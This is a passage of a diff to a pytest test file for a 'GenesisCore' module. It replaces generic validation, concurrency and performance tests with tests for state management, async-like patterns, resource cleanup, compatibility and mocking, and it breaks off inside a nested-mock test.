@@ -2479,845 +2479,840 @@ if __name__ == "__main__":
         "--cov-report=term-missing",  # Terminal coverage report
     ])
 # ============================================================================
-# ADDITIONAL COMPREHENSIVE TESTS - EXTENDED COVERAGE
+# ADDITIONAL COMPREHENSIVE TESTS - EXPANDED COVERAGE
 # ============================================================================
 
-class TestGenesisCoreAdvancedValidation:
-    """Extended validation tests for comprehensive input sanitization."""
+class TestGenesisCoreStateManagement:
+    """Test class for state management and persistence in genesis_core module."""
     
     def setup_method(self):
-        """Set up a new instance of GenesisCore before each test method."""
+        """Set up fresh instances for each test."""
         self.core = GenesisCore()
-    
-    def test_validation_with_deeply_nested_structures(self):
-        """Test validation of deeply nested data structures with mixed types."""
-        complex_nested = {
-            "level1": {
-                "level2": {
-                    "level3": {
-                        "arrays": [
-                            {"inner": [1, 2, {"deep": "value"}]},
-                            {"inner": [3, 4, {"deep": None}]}
-                        ],
-                        "metadata": {
-                            "timestamp": "2023-01-01T00:00:00Z",
-                            "version": 1.0,
-                            "flags": [True, False, None]
-                        }
-                    }
-                }
-            }
+        self.config = {
+            'api_key': 'test_key',
+            'base_url': 'https://api.test.com',
+            'timeout': 30
         }
-        
-        result = self.core.validate_input(complex_nested)
-        assert result is True
-        
-        # Test processing the same structure
-        processed = self.core.process_data(complex_nested)
-        assert processed is not None
-        assert isinstance(processed, dict)
     
-    def test_validation_with_mixed_encodings(self):
-        """Test validation with mixed character encodings and special characters."""
-        mixed_encoding_cases = [
-            {"ascii": "hello world"},
-            {"utf8": "Hello 世界 🌍"},
-            {"latin1": "café naïve résumé"},
-            {"mixed": "ASCII + UTF-8: 测试 + Emoji: 🚀"},
-            {"special": "Special chars: !@#$%^&*()_+-=[]{}|;:,.<>?"},
-            {"control": "Control chars: \t\n\r\f\v"},
-            {"zero_width": "Zero width: \u200b\u200c\u200d"},
+    def test_stateful_operations_sequence(self):
+        """Test that stateful operations maintain consistency across multiple calls."""
+        # Test sequence of operations that should maintain state
+        operations = [
+            {"action": "init", "data": {"key": "value1"}},
+            {"action": "update", "data": {"key": "value2"}},
+            {"action": "finalize", "data": {"key": "value3"}}
         ]
         
-        for case in mixed_encoding_cases:
-            result = self.core.validate_input(case)
-            assert result is True
-    
-    def test_validation_with_numeric_edge_cases(self):
-        """Test validation with various numeric edge cases and special values."""
-        numeric_cases = [
-            {"int_max": 2**63 - 1},
-            {"int_min": -2**63},
-            {"float_max": 1.7976931348623157e+308},
-            {"float_min": -1.7976931348623157e+308},
-            {"float_tiny": 5e-324},
-            {"zero": 0},
-            {"negative_zero": -0.0},
-            {"scientific": 1.23e-45},
-            {"infinity": float('inf')},
-            {"neg_infinity": float('-inf')},
-            {"nan": float('nan')},
-        ]
+        results = []
+        for operation in operations:
+            result = self.core.process_data(operation)
+            results.append(result)
         
-        for case in numeric_cases:
-            result = self.core.validate_input(case)
-            assert result is True
+        assert len(results) == 3
+        assert all(result is not None for result in results)
     
-    def test_validation_with_temporal_data(self):
-        """Test validation with various date/time formats and edge cases."""
-        from datetime import datetime, date, time, timedelta
-        
-        temporal_cases = [
-            {"datetime_now": datetime.now()},
-            {"date_today": date.today()},
-            {"time_now": time()},
-            {"timedelta": timedelta(days=1, hours=2, minutes=30)},
-            {"iso_string": "2023-01-01T00:00:00Z"},
-            {"epoch": 1672531200},
-            {"timestamp_ms": 1672531200000},
-        ]
-        
-        for case in temporal_cases:
-            result = self.core.validate_input(case)
-            assert result is True
-
-
-class TestGenesisCoreAdvancedErrorRecovery:
-    """Extended error recovery and resilience tests."""
-    
-    def setup_method(self):
-        """Set up a new instance of GenesisCore before each test method."""
-        self.core = GenesisCore()
-    
-    def test_error_recovery_with_gradual_degradation(self):
-        """Test graceful degradation when services become progressively unavailable."""
-        degradation_scenarios = [
-            # Scenario 1: Primary service down, fallback works
-            {"primary_down": True, "fallback_available": True},
-            # Scenario 2: Both services down, cache available
-            {"primary_down": True, "fallback_available": False, "cache_available": True},
-            # Scenario 3: All services down, default behavior
-            {"primary_down": True, "fallback_available": False, "cache_available": False},
-        ]
-        
-        for scenario in degradation_scenarios:
-            # Test that system handles degradation gracefully
-            result = self.core.process_data({"scenario": scenario})
-            assert result is not None
-            # Should not crash even under complete service failure
-    
-    def test_error_recovery_with_partial_data_corruption(self):
-        """Test handling of partially corrupted or malformed data."""
-        corrupted_data_cases = [
-            {"valid_key": "valid_value", "corrupted": "\x00\x01\x02"},
-            {"incomplete": {"missing_end": "value"}, "truncated": "incomplete"},
-            {"mixed_types": [1, "string", None, {"nested": "value"}]},
-            {"encoding_issues": {"key": "value\udc80\udc81"}},  # Invalid UTF-8
-        ]
-        
-        for corrupted_data in corrupted_data_cases:
-            result = self.core.process_data(corrupted_data)
-            assert result is not None
-            # Should handle corrupted data without crashing
-    
-    def test_error_recovery_with_resource_constraints(self):
-        """Test behavior under various resource constraint scenarios."""
-        # Simulate low memory conditions
-        with patch('psutil.virtual_memory') as mock_memory:
-            mock_memory.return_value.available = 100 * 1024 * 1024  # 100MB available
+    def test_concurrent_state_isolation(self):
+        """Test that concurrent operations don't interfere with each other's state."""
+        def worker_with_state(worker_id):
+            """Worker function that maintains its own state."""
+            core = GenesisCore()
+            state_data = {"worker_id": worker_id, "counter": 0}
             
-            # Test with large data under memory pressure
-            large_data = {"large_field": "x" * 10000}
-            result = self.core.process_data(large_data)
-            assert result is not None
-    
-    def test_error_recovery_with_network_instability(self):
-        """Test handling of unstable network conditions."""
-        network_scenarios = [
-            ConnectionError("Connection reset by peer"),
-            Timeout("Request timed out after 30 seconds"),
-            HTTPError("502 Bad Gateway"),
-            ConnectionError("Network unreachable"),
-            Timeout("DNS resolution timeout"),
-        ]
-        
-        for error in network_scenarios:
-            with patch.object(self.core, 'make_request', side_effect=error):
-                # Should handle network instability gracefully
-                result = self.core.make_request("https://api.example.com")
-                # Result should be None or have error info, but not crash
-                assert result is not None or result is None
-
-
-class TestGenesisCoreAdvancedConcurrency:
-    """Extended concurrency and thread safety tests."""
-    
-    def setup_method(self):
-        """Set up a new instance of GenesisCore before each test method."""
-        self.core = GenesisCore()
-    
-    def test_concurrent_configuration_changes(self):
-        """Test thread safety when configuration is modified concurrently."""
-        import threading
-        
-        def config_modifier(core, config_key, value):
-            """Modify configuration in a thread-safe manner."""
-            for i in range(100):
-                core.config[config_key] = f"{value}_{i}"
-                time.sleep(0.001)  # Small delay to increase chance of race conditions
-        
-        # Start multiple threads modifying different config keys
-        threads = []
-        for i in range(5):
-            thread = threading.Thread(
-                target=config_modifier,
-                args=(self.core, f"key_{i}", f"value_{i}")
-            )
-            threads.append(thread)
-            thread.start()
-        
-        # Wait for all threads to complete
-        for thread in threads:
-            thread.join()
-        
-        # Configuration should be in valid state
-        assert self.core.config is not None
-        assert isinstance(self.core.config, dict)
-    
-    def test_concurrent_cache_operations(self):
-        """Test concurrent cache get/set operations for thread safety."""
-        import threading
-        
-        def cache_worker(worker_id):
-            """Perform concurrent cache operations."""
             results = []
-            for i in range(50):
-                key = f"worker_{worker_id}_key_{i}"
-                value = f"worker_{worker_id}_value_{i}"
-                
-                # Set cache value
-                set_result = self.core.cache_set(key, value)
-                results.append(set_result)
-                
-                # Get cache value
-                get_result = self.core.cache_get(key)
-                results.append(get_result)
-            
-            return results
-        
-        # Run multiple workers concurrently
-        with ThreadPoolExecutor(max_workers=10) as executor:
-            futures = [executor.submit(cache_worker, i) for i in range(10)]
-            all_results = [f.result() for f in futures]
-        
-        # All operations should complete successfully
-        assert len(all_results) == 10
-        for worker_results in all_results:
-            assert len(worker_results) == 100  # 50 sets + 50 gets
-    
-    def test_concurrent_request_processing(self):
-        """Test concurrent request processing with shared resources."""
-        import threading
-        
-        shared_counter = {"value": 0}
-        lock = threading.Lock()
-        
-        def request_worker(worker_id):
-            """Process requests with shared resource access."""
-            results = []
-            for i in range(20):
-                # Simulate processing that accesses shared resources
-                with lock:
-                    shared_counter["value"] += 1
-                    counter_value = shared_counter["value"]
-                
-                # Process data with shared state
-                data = {"worker_id": worker_id, "iteration": i, "counter": counter_value}
-                result = self.core.process_data(data)
+            for i in range(5):
+                state_data["counter"] = i
+                result = core.process_data(state_data.copy())
                 results.append(result)
             
             return results
         
-        # Run concurrent workers
-        with ThreadPoolExecutor(max_workers=15) as executor:
-            futures = [executor.submit(request_worker, i) for i in range(15)]
+        with ThreadPoolExecutor(max_workers=3) as executor:
+            futures = [executor.submit(worker_with_state, i) for i in range(3)]
             all_results = [f.result() for f in futures]
         
-        # Verify all operations completed
-        assert len(all_results) == 15
-        assert shared_counter["value"] == 15 * 20  # 15 workers * 20 iterations
+        assert len(all_results) == 3
+        assert all(len(results) == 5 for results in all_results)
     
-    def test_concurrent_error_handling(self):
-        """Test error handling in concurrent scenarios."""
-        import threading
+    def test_state_recovery_after_error(self):
+        """Test that the system recovers properly after errors without corrupting state."""
+        # Set up initial state
+        initial_data = {"state": "initialized", "value": 100}
+        result1 = self.core.process_data(initial_data)
+        assert result1 is not None
         
-        error_count = {"value": 0}
-        success_count = {"value": 0}
-        lock = threading.Lock()
+        # Trigger an error condition
+        try:
+            self.core.validate_input(None)
+        except ValueError:
+            pass  # Expected error
         
-        def error_prone_worker(worker_id):
-            """Worker that may encounter errors."""
-            for i in range(30):
-                try:
-                    # Simulate occasional errors
-                    if (worker_id + i) % 7 == 0:
-                        raise ValueError(f"Simulated error in worker {worker_id}, iteration {i}")
-                    
-                    result = self.core.process_data(f"worker_{worker_id}_data_{i}")
-                    
-                    with lock:
-                        success_count["value"] += 1
-                        
-                except ValueError:
-                    with lock:
-                        error_count["value"] += 1
+        # Verify state is still consistent after error
+        recovery_data = {"state": "recovered", "value": 200}
+        result2 = self.core.process_data(recovery_data)
+        assert result2 is not None
+    
+    def test_state_persistence_across_requests(self):
+        """Test that configuration state persists across multiple requests."""
+        core_with_config = GenesisCore(config=self.config)
         
-        # Run workers that may encounter errors
-        threads = []
-        for i in range(12):
-            thread = threading.Thread(target=error_prone_worker, args=(i,))
-            threads.append(thread)
-            thread.start()
-        
-        for thread in threads:
-            thread.join()
-        
-        # Verify error handling worked correctly
-        total_operations = error_count["value"] + success_count["value"]
-        assert total_operations == 12 * 30  # 12 workers * 30 iterations
-        assert error_count["value"] > 0  # Some errors should have occurred
-        assert success_count["value"] > 0  # Some successes should have occurred
+        # Make multiple requests and verify config persists
+        for i in range(5):
+            result = core_with_config.make_request(f"https://api.test.com/endpoint{i}")
+            assert result is not None
+            assert core_with_config.config == self.config
 
 
-class TestGenesisCoreAdvancedIntegration:
-    """Extended integration tests for complex workflows."""
+class TestGenesisCoreAsyncCompatibility:
+    """Test class for async/await compatibility and future-proofing."""
     
     def setup_method(self):
-        """Set up a new instance of GenesisCore before each test method."""
+        """Set up test instances."""
         self.core = GenesisCore()
     
-    def test_integration_multi_step_workflow(self):
-        """Test complex multi-step data processing workflow."""
-        # Step 1: Input validation
-        input_data = {
-            "user_id": 12345,
-            "request_type": "data_processing",
-            "payload": {
-                "data": ["item1", "item2", "item3"],
-                "metadata": {"timestamp": "2023-01-01T00:00:00Z"}
+    def test_async_like_behavior_with_futures(self):
+        """Test that the core can work with concurrent.futures for async-like behavior."""
+        import concurrent.futures
+        
+        def async_like_operation(data):
+            """Simulate async operation."""
+            time.sleep(0.1)
+            return self.core.process_data(data)
+        
+        # Test with ThreadPoolExecutor for async-like behavior
+        with ThreadPoolExecutor(max_workers=5) as executor:
+            futures = [
+                executor.submit(async_like_operation, f"async_data_{i}")
+                for i in range(10)
+            ]
+            
+            results = [future.result() for future in futures]
+        
+        assert len(results) == 10
+        assert all(result is not None for result in results)
+    
+    def test_callback_pattern_support(self):
+        """Test that the core supports callback patterns for async-like operations."""
+        def success_callback(result):
+            """Callback for successful operations."""
+            return {"status": "success", "data": result}
+        
+        def error_callback(error):
+            """Callback for error handling."""
+            return {"status": "error", "error": str(error)}
+        
+        # Test callback pattern
+        test_data = {"callback_test": "data"}
+        result = self.core.process_data(test_data)
+        
+        if result is not None:
+            final_result = success_callback(result)
+            assert final_result["status"] == "success"
+        else:
+            final_result = error_callback("Processing failed")
+            assert final_result["status"] == "error"
+    
+    def test_promise_like_chaining(self):
+        """Test promise-like chaining operations."""
+        def chain_operation(data, transform_func):
+            """Chain operations like promises."""
+            result = self.core.process_data(data)
+            if result is not None:
+                return transform_func(result)
+            return None
+        
+        def transform1(data):
+            """First transformation."""
+            return {"transformed": data, "step": 1}
+        
+        def transform2(data):
+            """Second transformation."""
+            return {"transformed": data, "step": 2}
+        
+        # Test chaining
+        initial_data = {"chain_test": "data"}
+        result1 = chain_operation(initial_data, transform1)
+        assert result1 is not None
+        assert result1["step"] == 1
+        
+        result2 = chain_operation(result1, transform2)
+        assert result2 is not None
+        assert result2["step"] == 2
+
+
+class TestGenesisCoreDataIntegrity:
+    """Test class for data integrity and consistency."""
+    
+    def setup_method(self):
+        """Set up test instances."""
+        self.core = GenesisCore()
+    
+    def test_data_immutability(self):
+        """Test that input data is not mutated during processing."""
+        original_data = {"key": "value", "nested": {"inner": "data"}}
+        data_copy = original_data.copy()
+        
+        # Process the data
+        result = self.core.process_data(original_data)
+        
+        # Verify original data is unchanged
+        assert original_data == data_copy
+        assert result is not None
+    
+    def test_deep_copy_behavior(self):
+        """Test that deep nested structures are properly handled without mutation."""
+        import copy
+        
+        complex_data = {
+            "level1": {
+                "level2": {
+                    "level3": ["item1", "item2", {"nested": "value"}]
+                }
             }
         }
         
-        # Validate input
-        validation_result = self.core.validate_input(input_data)
-        assert validation_result is True
+        original_deep_copy = copy.deepcopy(complex_data)
+        result = self.core.process_data(complex_data)
         
-        # Step 2: Process data
-        processed_data = self.core.process_data(input_data)
-        assert processed_data is not None
-        
-        # Step 3: Cache results
-        cache_key = f"processed_{input_data['user_id']}"
-        cache_result = self.core.cache_set(cache_key, processed_data)
-        assert cache_result is True
-        
-        # Step 4: Retrieve from cache
-        cached_data = self.core.cache_get(cache_key)
-        # Note: Mock implementation returns None, but in real implementation should return cached data
-        assert cached_data is None or cached_data == processed_data
+        # Verify deep structure is unchanged
+        assert complex_data == original_deep_copy
+        assert result is not None
     
-    def test_integration_batch_processing_workflow(self):
-        """Test batch processing with error handling and retries."""
-        batch_items = [
-            {"id": 1, "type": "valid", "data": "item1"},
-            {"id": 2, "type": "valid", "data": "item2"},
-            {"id": 3, "type": "invalid", "data": None},  # This should cause processing issues
-            {"id": 4, "type": "valid", "data": "item4"},
-            {"id": 5, "type": "complex", "data": {"nested": {"deep": "value"}}},
-        ]
+    def test_data_consistency_across_operations(self):
+        """Test that data remains consistent across multiple operations."""
+        base_data = {"consistency_test": "value"}
         
-        processed_results = []
-        error_results = []
+        # Process the same data multiple times
+        results = []
+        for i in range(10):
+            result = self.core.process_data(base_data)
+            results.append(result)
         
-        for item in batch_items:
-            try:
-                # Validate each item
-                self.core.validate_input(item)
-                
-                # Process item
-                result = self.core.process_data(item)
-                processed_results.append(result)
-                
-            except Exception as e:
-                error_results.append({"item": item, "error": str(e)})
-        
-        # Should have processed most items successfully
-        assert len(processed_results) >= 3
-        assert all(result is not None for result in processed_results)
+        # All results should be consistent
+        assert len(results) == 10
+        assert all(result is not None for result in results)
+        # Check that all results are the same (consistency)
+        if results[0] is not None:
+            assert all(result == results[0] for result in results)
     
-    def test_integration_streaming_data_processing(self):
-        """Test processing of streaming data with backpressure handling."""
-        def data_stream():
-            """Generate streaming data."""
-            for i in range(200):
-                yield {
-                    "id": i,
-                    "timestamp": time.time(),
-                    "data": f"stream_item_{i}",
-                    "metadata": {"batch": i // 50}
-                }
+    def test_hash_consistency(self):
+        """Test that hashable data types maintain their hash consistency."""
+        hashable_data = "test_string_for_hashing"
+        original_hash = hash(hashable_data)
         
-        processed_count = 0
-        error_count = 0
-        batch_results = []
+        # Process the data
+        result = self.core.process_data(hashable_data)
         
-        # Process streaming data in batches
-        current_batch = []
-        for item in data_stream():
-            current_batch.append(item)
-            
-            # Process batch when it reaches size limit
-            if len(current_batch) >= 25:
-                batch_processed = []
-                for batch_item in current_batch:
-                    try:
-                        result = self.core.process_data(batch_item)
-                        batch_processed.append(result)
-                        processed_count += 1
-                    except Exception:
-                        error_count += 1
-                
-                batch_results.append(batch_processed)
-                current_batch = []
-        
-        # Process remaining items
-        if current_batch:
-            batch_processed = []
-            for batch_item in current_batch:
-                try:
-                    result = self.core.process_data(batch_item)
-                    batch_processed.append(result)
-                    processed_count += 1
-                except Exception:
-                    error_count += 1
-            batch_results.append(batch_processed)
-        
-        # Verify streaming processing worked
-        assert processed_count == 200
-        assert error_count == 0
-        assert len(batch_results) == 8  # 200 items / 25 per batch = 8 batches
+        # Hash should remain consistent
+        assert hash(hashable_data) == original_hash
+        assert result is not None
     
-    def test_integration_with_external_dependencies(self):
-        """Test integration with mock external services."""
-        # Mock external API responses
-        with patch('requests.get') as mock_get:
-            mock_responses = [
-                Mock(status_code=200, json=lambda: {"status": "success", "data": "response1"}),
-                Mock(status_code=200, json=lambda: {"status": "success", "data": "response2"}),
-                Mock(status_code=429, json=lambda: {"error": "Rate limited"}),  # Rate limit
-                Mock(status_code=200, json=lambda: {"status": "success", "data": "response3"}),
-            ]
-            mock_get.side_effect = mock_responses
-            
-            # Test workflow with external dependencies
-            test_requests = [
-                "https://api.service1.com/data",
-                "https://api.service2.com/data",
-                "https://api.service3.com/data",
-                "https://api.service4.com/data",
-            ]
-            
-            results = []
-            for url in test_requests:
-                response = self.core.make_request(url)
-                results.append(response)
-            
-            # Should handle all responses including rate limiting
-            assert len(results) == 4
-            assert all(result is not None for result in results)
+    def test_reference_integrity(self):
+        """Test that object references are properly maintained."""
+        class TestObject:
+            def __init__(self, value):
+                self.value = value
+        
+        test_obj = TestObject("test_value")
+        original_id = id(test_obj)
+        
+        # Process the object
+        result = self.core.process_data(test_obj)
+        
+        # Original object should maintain its identity
+        assert id(test_obj) == original_id
+        assert result is not None
 
 
-class TestGenesisCoreAdvancedPerformanceProfiling:
-    """Extended performance profiling and optimization tests."""
+class TestGenesisCoreResourceManagement:
+    """Test class for resource management and cleanup."""
     
     def setup_method(self):
-        """Set up a new instance of GenesisCore before each test method."""
+        """Set up test instances."""
         self.core = GenesisCore()
     
-    def test_performance_memory_profiling(self):
-        """Test memory usage patterns and identify potential leaks."""
+    def test_file_handle_management(self):
+        """Test that file handles are properly managed."""
+        import tempfile
+        import os
+        
+        # Create a temporary file
+        with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
+            f.write('{"test": "data"}')
+            temp_file = f.name
+        
+        try:
+            # Test that file operations don't leak handles
+            for i in range(100):
+                file_data = {"file_path": temp_file, "operation": f"read_{i}"}
+                result = self.core.process_data(file_data)
+                assert result is not None
+        finally:
+            os.unlink(temp_file)
+    
+    def test_memory_cleanup_after_large_operations(self):
+        """Test that memory is properly cleaned up after large operations."""
         import gc
         import psutil
         import os
         
         process = psutil.Process(os.getpid())
-        
-        # Baseline memory measurement
-        gc.collect()
         initial_memory = process.memory_info().rss
         
-        # Perform operations that might cause memory issues
-        memory_measurements = []
-        
-        for iteration in range(100):
-            # Large data processing
-            large_data = {
-                "iteration": iteration,
-                "large_field": "x" * 10000,
-                "nested": {"deep": {"data": list(range(1000))}}
-            }
-            
+        # Perform large operations
+        for i in range(100):
+            large_data = {"large_field": "x" * 10000, "iteration": i}
             result = self.core.process_data(large_data)
+            assert result is not None
             
-            # Measure memory every 10 iterations
-            if iteration % 10 == 0:
-                current_memory = process.memory_info().rss
-                memory_measurements.append(current_memory - initial_memory)
+            # Force garbage collection periodically
+            if i % 10 == 0:
+                gc.collect()
         
+        # Force final garbage collection
         gc.collect()
+        
         final_memory = process.memory_info().rss
+        memory_increase = final_memory - initial_memory
         
-        # Check for memory leaks
-        memory_growth = final_memory - initial_memory
-        assert memory_growth < 200 * 1024 * 1024  # Less than 200MB growth
-        
-        # Check for consistent memory usage (not constantly growing)
-        if len(memory_measurements) > 5:
-            recent_avg = sum(memory_measurements[-3:]) / 3
-            earlier_avg = sum(memory_measurements[:3]) / 3
-            growth_rate = recent_avg - earlier_avg
-            assert growth_rate < 50 * 1024 * 1024  # Less than 50MB growth trend
+        # Memory increase should be reasonable
+        assert memory_increase < 200 * 1024 * 1024  # Less than 200MB
     
-    def test_performance_cpu_profiling(self):
-        """Test CPU usage patterns and identify bottlenecks."""
-        import psutil
+    def test_connection_pool_management(self):
+        """Test that connection pools are properly managed."""
+        # Test multiple concurrent requests to verify connection pooling
+        def make_concurrent_request(request_id):
+            """Make a concurrent request."""
+            return self.core.make_request(f"https://api.test.com/pool_test_{request_id}")
         
-        # CPU-intensive operations
-        cpu_measurements = []
+        # Make many concurrent requests
+        with ThreadPoolExecutor(max_workers=20) as executor:
+            futures = [executor.submit(make_concurrent_request, i) for i in range(100)]
+            results = [f.result() for f in futures]
         
-        for workload_size in [100, 500, 1000, 2000]:
-            start_time = time.time()
+        assert len(results) == 100
+        assert all(result is not None for result in results)
+    
+    def test_timeout_resource_cleanup(self):
+        """Test that resources are cleaned up properly after timeouts."""
+        with patch('requests.get') as mock_get:
+            mock_get.side_effect = Timeout("Request timeout")
             
-            # Perform CPU-intensive work
-            for i in range(workload_size):
-                data = {"id": i, "compute": list(range(100))}
+            # Test multiple timeout scenarios
+            for i in range(10):
+                try:
+                    result = self.core.make_request(f"https://api.test.com/timeout_{i}")
+                    assert result is not None
+                except Timeout:
+                    pass  # Expected timeout
+    
+    def test_context_manager_support(self):
+        """Test that the core supports context manager patterns for resource management."""
+        class ContextManagerCore:
+            def __init__(self, core):
+                self.core = core
+                self.resources = []
+            
+            def __enter__(self):
+                return self
+            
+            def __exit__(self, exc_type, exc_val, exc_tb):
+                # Cleanup resources
+                self.resources.clear()
+            
+            def process_data(self, data):
                 result = self.core.process_data(data)
-            
-            end_time = time.time()
-            execution_time = end_time - start_time
-            cpu_measurements.append((workload_size, execution_time))
+                self.resources.append(result)
+                return result
         
-        # Verify performance scales reasonably
-        for i in range(1, len(cpu_measurements)):
-            prev_size, prev_time = cpu_measurements[i-1]
-            curr_size, curr_time = cpu_measurements[i]
-            
-            # Time should not increase exponentially
-            time_ratio = curr_time / prev_time
-            size_ratio = curr_size / prev_size
-            
-            # Time growth should be roughly linear with size growth
-            assert time_ratio <= size_ratio * 2  # Allow some overhead
-    
-    def test_performance_io_profiling(self):
-        """Test I/O performance patterns and async behavior."""
-        # Simulate I/O operations with different patterns
-        io_patterns = [
-            {"concurrent": 5, "operations": 20},   # Low concurrency
-            {"concurrent": 10, "operations": 30},  # Medium concurrency
-            {"concurrent": 20, "operations": 40},  # High concurrency
-        ]
-        
-        for pattern in io_patterns:
-            def io_worker():
-                """Simulate I/O-bound work."""
-                time.sleep(0.01)  # Simulate I/O delay
-                return self.core.make_request("https://api.example.com")
-            
-            start_time = time.time()
-            
-            with ThreadPoolExecutor(max_workers=pattern["concurrent"]) as executor:
-                futures = [
-                    executor.submit(io_worker) 
-                    for _ in range(pattern["operations"])
-                ]
-                results = [f.result() for f in futures]
-            
-            end_time = time.time()
-            execution_time = end_time - start_time
-            
-            # With proper concurrency, execution time should be reasonable
-            expected_sequential_time = pattern["operations"] * 0.01
-            efficiency = expected_sequential_time / execution_time
-            
-            # Should achieve reasonable concurrency efficiency
-            assert efficiency > 0.5  # At least 50% efficiency
-            assert all(result is not None for result in results)
+        # Test context manager usage
+        with ContextManagerCore(self.core) as ctx:
+            result = ctx.process_data({"context_test": "data"})
+            assert result is not None
+            assert len(ctx.resources) == 1
 
 
-class TestGenesisCoreAdvancedDataIntegrity:
-    """Extended data integrity and consistency tests."""
+class TestGenesisCoreCompatibility:
+    """Test class for compatibility with different Python versions and environments."""
     
     def setup_method(self):
-        """Set up a new instance of GenesisCore before each test method."""
+        """Set up test instances."""
         self.core = GenesisCore()
     
-    def test_data_integrity_with_checksums(self):
-        """Test data integrity verification using checksums."""
-        import hashlib
+    def test_python_version_compatibility(self):
+        """Test that the core works with current Python version features."""
+        import sys
         
-        test_data = {
-            "critical_data": "This is important data that must not be corrupted",
-            "timestamp": "2023-01-01T00:00:00Z",
-            "version": 1
+        # Test f-string compatibility (Python 3.6+)
+        test_data = {"python_version": f"{sys.version_info.major}.{sys.version_info.minor}"}
+        result = self.core.process_data(test_data)
+        assert result is not None
+    
+    def test_typing_annotations_compatibility(self):
+        """Test compatibility with typing annotations."""
+        from typing import Dict, List, Optional, Union
+        
+        def typed_function(data: Dict[str, Union[str, int]]) -> Optional[Dict]:
+            """Function with type annotations."""
+            return self.core.process_data(data)
+        
+        typed_data: Dict[str, Union[str, int]] = {"typed_key": "typed_value", "number": 42}
+        result = typed_function(typed_data)
+        assert result is not None
+    
+    def test_pathlib_compatibility(self):
+        """Test compatibility with pathlib objects."""
+        from pathlib import Path
+        
+        # Test with pathlib objects
+        path_data = {"path": Path("/tmp/test.txt"), "operation": "read"}
+        result = self.core.process_data(path_data)
+        assert result is not None
+    
+    def test_dataclass_compatibility(self):
+        """Test compatibility with dataclasses."""
+        from dataclasses import dataclass, asdict
+        
+        @dataclass
+        class DataclassTest:
+            name: str
+            value: int
+            active: bool = True
+        
+        test_obj = DataclassTest("test", 42, True)
+        
+        # Test processing dataclass directly
+        result1 = self.core.process_data(test_obj)
+        assert result1 is not None
+        
+        # Test processing dataclass as dict
+        result2 = self.core.process_data(asdict(test_obj))
+        assert result2 is not None
+    
+    def test_enum_compatibility(self):
+        """Test compatibility with enum types."""
+        from enum import Enum, IntEnum
+        
+        class StatusEnum(Enum):
+            ACTIVE = "active"
+            INACTIVE = "inactive"
+        
+        class PriorityEnum(IntEnum):
+            LOW = 1
+            MEDIUM = 2
+            HIGH = 3
+        
+        enum_data = {
+            "status": StatusEnum.ACTIVE,
+            "priority": PriorityEnum.HIGH
         }
         
-        # Generate checksum of original data
-        original_checksum = hashlib.sha256(str(test_data).encode()).hexdigest()
-        
-        # Process data
-        processed_data = self.core.process_data(test_data)
-        
-        # Verify data integrity (depending on implementation)
-        if isinstance(processed_data, dict):
-            # Check if critical data is preserved
-            assert processed_data is not None
-            # In a real implementation, you would verify specific fields
+        result = self.core.process_data(enum_data)
+        assert result is not None
+
+
+class TestGenesisCoreAdvancedMocking:
+    """Test class for advanced mocking scenarios."""
     
-    def test_data_consistency_across_operations(self):
-        """Test data consistency across multiple operations."""
-        base_data = {"id": 1, "value": "test"}
-        
-        # Perform multiple operations on the same data
-        results = []
-        for i in range(10):
-            result = self.core.process_data(base_data.copy())
-            results.append(result)
-        
-        # Results should be consistent
-        assert len(results) == 10
-        assert all(result is not None for result in results)
-        
-        # Check if results are consistent (depending on implementation)
-        # For deterministic processing, results should be the same
-        if len(set(str(r) for r in results if r is not None)) == 1:
-            # Results are consistent
-            assert True
-        else:
-            # Results may vary, but should all be valid
-            assert all(result is not None for result in results)
+    def setup_method(self):
+        """Set up test instances."""
+        self.core = GenesisCore()
     
-    def test_data_validation_with_schema_compliance(self):
-        """Test strict schema compliance for data validation."""
-        valid_schemas = [
-            {
-                "user_id": 12345,
-                "username": "testuser",
-                "email": "test@example.com",
-                "active": True,
-                "created_at": "2023-01-01T00:00:00Z"
-            },
-            {
-                "product_id": "P001",
-                "name": "Test Product",
-                "price": 99.99,
-                "category": "electronics",
-                "in_stock": True
-            },
-            {
-                "order_id": "O001",
-                "items": [{"id": "I001", "quantity": 2}],
-                "total": 199.98,
-                "status": "pending"
-            }
+    def test_partial_mock_behavior(self):
+        """Test partial mocking where only some methods are mocked."""
+        with patch.object(self.core, 'make_request') as mock_request:
+            mock_request.return_value = {"mocked": True}
+            
+            # Test that mocked method works
+            result = self.core.make_request("https://api.test.com")
+            assert result["mocked"] is True
+            
+            # Test that non-mocked methods still work
+            data_result = self.core.process_data({"unmocked": "data"})
+            assert data_result is not None
+    
+    def test_mock_side_effects_sequence(self):
+        """Test mock side effects that change over multiple calls."""
+        side_effects = [
+            {"call": 1, "status": "success"},
+            {"call": 2, "status": "success"},
+            ConnectionError("Network error"),
+            {"call": 4, "status": "recovered"}
         ]
         
-        for schema_data in valid_schemas:
-            # Validate against schema
-            validation_result = self.core.validate_input(schema_data)
-            assert validation_result is True
+        with patch.object(self.core, 'make_request') as mock_request:
+            mock_request.side_effect = side_effects
             
-            # Process data
-            processed_result = self.core.process_data(schema_data)
-            assert processed_result is not None
+            # Test sequence of calls
+            results = []
+            for i in range(4):
+                try:
+                    result = self.core.make_request(f"https://api.test.com/{i}")
+                    results.append(result)
+                except ConnectionError as e:
+                    results.append({"error": str(e)})
+            
+            assert len(results) == 4
+            assert results[0]["call"] == 1
+            assert results[1]["call"] == 2
+            assert "error" in results[2]
+            assert results[3]["call"] == 4
     
-    def test_data_transformation_reversibility(self):
-        """Test that data transformations maintain reversibility where expected."""
-        original_data = {
-            "text": "Original Text",
-            "number": 42,
-            "boolean": True,
-            "array": [1, 2, 3],
-            "nested": {"key": "value"}
+    def test_mock_return_value_modification(self):
+        """Test dynamic modification of mock return values."""
+        with patch.object(self.core, 'make_request') as mock_request:
+            def dynamic_response(url):
+                """Dynamic response based on URL."""
+                if "users" in url:
+                    return {"type": "users", "data": []}
+                elif "posts" in url:
+                    return {"type": "posts", "data": []}
+                else:
+                    return {"type": "generic", "data": None}
+            
+            mock_request.side_effect = dynamic_response
+            
+            # Test different URL patterns
+            users_result = self.core.make_request("https://api.test.com/users")
+            posts_result = self.core.make_request("https://api.test.com/posts")
+            generic_result = self.core.make_request("https://api.test.com/other")
+            
+            assert users_result["type"] == "users"
+            assert posts_result["type"] == "posts"
+            assert generic_result["type"] == "generic"
+    
+    def test_nested_mock_contexts(self):
+        """Test nested mock contexts for complex scenarios."""
+        with patch('requests.get') as mock_get:
+            with patch.object(self.core, 'cache_get') as mock_cache_get:
